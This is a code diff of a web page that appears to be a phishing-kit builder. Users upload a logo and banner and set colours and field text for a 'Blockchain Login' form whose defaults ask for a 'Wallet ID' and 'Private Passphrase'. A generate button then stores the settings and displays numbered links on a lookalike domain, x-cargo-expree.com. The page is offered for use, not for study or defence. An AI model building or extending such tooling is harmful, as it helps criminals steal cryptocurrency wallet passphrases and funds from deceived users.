@@ -101,87 +101,91 @@
       border-radius: 6px;
       margin-bottom: 10px;
     }
+
+    .generated-link {
+      margin-top: 20px;
+      padding: 12px;
+      background: #e6f0ff;
+      border: 1px solid #a3c2ff;
+      color: #003380;
+      font-weight: bold;
+      text-align: center;
+      border-radius: 6px;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="upload-header">
-      ✔️ IMAGE (UPLOAD)
-    </div>
-    <div class="upload-icon">
-      ⬆️
-    </div>
-    <div class="upload-note">
-      (PNG / JPG / JPEG / GIF)
-    </div>
+    <div class="upload-header">✔️ IMAGE (UPLOAD)</div>
+    <div class="upload-icon">⬆️</div>
+    <div class="upload-note">(PNG / JPG / JPEG / GIF)</div>
 
     <label>LOGO</label>
     <input type="file" accept="image/*" onchange="previewImage(this, 'logoPreview')" />
     <div class="image-preview" id="logoPreview">NO IMAGE</div>
 
     <label>LOGO SIZE</label>
-    <input type="text" value='width="70px" height="70px"' />
+    <input type="text" id="logoSize" value='width="70px" height="70px"' />
 
     <label>BANNER</label>
     <input type="file" accept="image/*" onchange="previewImage(this, 'bannerPreview')" />
     <div class="image-preview" id="bannerPreview">NO IMAGE</div>
 
     <label>BANNER SIZE</label>
-    <input type="text" value='width="300px" height="50px"' />
+    <input type="text" id="bannerSize" value='width="300px" height="50px"' />
 
     <label>TEMPLATE NAME</label>
-    <input type="text" placeholder="NAME" />
+    <input type="text" id="templateName" placeholder="NAME" />
 
     <label>BODY COLOR</label>
-    <input type="color" value="#000000" />
+    <input type="color" id="bodyColor" value="#000000" />
 
     <label>BUTTON COLOR</label>
-    <input type="color" value="#0057ff" />
+    <input type="color" id="buttonColor" value="#0057ff" />
 
     <label>TEXT COLOR</label>
-    <input type="color" value="#000000" />
+    <input type="color" id="textColor" value="#000000" />
 
-    <div class="section-title">
-      ⚙️ INPUTs CONFIGURATION
-    </div>
+    <div class="section-title">⚙️ INPUTs CONFIGURATION</div>
 
     <label>DESCRIPTION</label>
-    <input type="text" value="Blockchain Login" />
+    <input type="text" id="description" value="Blockchain Login" />
 
     <div class="inline-group">
       <div>
         <label>EMAIL CONTENT</label>
-        <input type="text" value="Wallet ID or Username" />
+        <input type="text" id="emailContent" value="Wallet ID or Username" />
       </div>
       <div>
         <label>EMAIL LABEL</label>
-        <input type="text" value="SHOW" />
+        <input type="text" id="emailLabel" value="SHOW" />
       </div>
     </div>
 
     <div class="inline-group">
       <div>
         <label>PASSWORD CONTENT</label>
-        <input type="text" value="Private Passphrase" />
+        <input type="text" id="passwordContent" value="Private Passphrase" />
       </div>
       <div>
         <label>PASSWORD LABEL</label>
-        <input type="text" value="SHOW" />
+        <input type="text" id="passwordLabel" value="SHOW" />
       </div>
     </div>
 
     <div class="inline-group">
       <div>
         <label>BUTTON CONTENT</label>
-        <input type="text" value="Log In" />
+        <input type="text" id="buttonContent" value="Log In" />
       </div>
       <div>
         <label>BUTTON WIDTH</label>
-        <input type="text" value="300px" />
+        <input type="text" id="buttonWidth" value="300px" />
       </div>
     </div>
 
     <button class="generate-button">✨ GENERATE</button>
+    <div id="generatedLink" class="generated-link" style="display:none;"></div>
   </div>
 
   <script>
@@ -193,12 +197,47 @@
         const reader = new FileReader();
         reader.onload = () => {
           preview.innerHTML = `<img src="${reader.result}" style="max-width: 100%; max-height: 100px; border-radius: 6px;" />`;
+          preview.setAttribute("data-image", reader.result); // store image
         };
         reader.readAsDataURL(file);
       } else {
         preview.innerHTML = "NO IMAGE";
+        preview.removeAttribute("data-image");
       }
     }
+
+    document.querySelector('.generate-button').addEventListener('click', () => {
+      let count = parseInt(localStorage.getItem("formCounter") || "1");
+      const link = `https://x-cargo-expree.com${count}`;
+
+      const data = {
+        logo: document.getElementById("logoPreview").getAttribute("data-image") || null,
+        logoSize: document.getElementById("logoSize").value,
+        banner: document.getElementById("bannerPreview").getAttribute("data-image") || null,
+        bannerSize: document.getElementById("bannerSize").value,
+        templateName: document.getElementById("templateName").value,
+        bodyColor: document.getElementById("bodyColor").value,
+        buttonColor: document.getElementById("buttonColor").value,
+        textColor: document.getElementById("textColor").value,
+        description: document.getElementById("description").value,
+        emailContent: document.getElementById("emailContent").value,
+        emailLabel: document.getElementById("emailLabel").value,
+        passwordContent: document.getElementById("passwordContent").value,
+        passwordLabel: document.getElementById("passwordLabel").value,
+        buttonContent: document.getElementById("buttonContent").value,
+        buttonWidth: document.getElementById("buttonWidth").value,
+        createdAt: new Date().toISOString()
+      };
+
+      // Save to localStorage
+      localStorage.setItem(`form_${count}`, JSON.stringify(data));
+      localStorage.setItem("formCounter", count + 1);
+
+      // Display the generated link
+      const linkDiv = document.getElementById("generatedLink");
+      linkDiv.style.display = "block";
+      linkDiv.innerHTML = `🔗 Form link: <a href="${link}" target="_blank">${link}</a>`;
+    });
   </script>
 </body>
 </html>
